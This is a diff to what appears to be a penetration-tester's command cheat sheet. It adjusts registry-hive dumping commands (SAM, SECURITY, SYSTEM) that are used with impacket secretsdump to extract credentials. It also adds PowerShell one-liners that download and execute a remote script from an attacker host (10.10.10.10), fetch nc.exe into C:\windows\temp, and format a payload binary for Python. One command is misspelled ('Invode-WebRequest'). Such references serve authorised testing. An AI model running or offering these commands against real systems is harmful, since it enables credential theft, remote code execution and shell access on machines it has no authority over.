@@ -39,9 +39,9 @@ Get-ChildItem -recurse | Select-String -pattern "cisco"
 compress-archive -path ./myfile -destinationPath ./myfile.zip
 
 # saving registry hives and fetching data with impacket 
-reg save hklm\sam c:\temp\sam.save
-reg save hklm\security c:\temp\security.save
-reg save hklm\system c:\temp\system.save
+reg save hklm\sam c:\windows\temp\sam.save
+reg save hklm\security c:\windows\temp\security.save
+reg save hklm\system c:\windows\temp\system.save
 python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 
 # mimikatz
@@ -69,6 +69,15 @@ usql.exe mssql://user:password@1.2.3.4/dbname
 select dbname.information_schema.tables 
 # fetch all databases from SQL Server
 select name from master.sys.databases
+
+# make a payload ready for python
+xxd -p payload.bin | sed 's/../\\x&/g'
+
+# powershell download and execute
+IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/myshell.ps1')
+powershell Invode-WebRequest -Uri http://10.10.10.10/myshell.ps1
+# download with powershell
+powershell IWR -Uri http://10.10.10.10/nc.exe -OutFile C:\\windows\\temp\\nc.exe
 
 
 
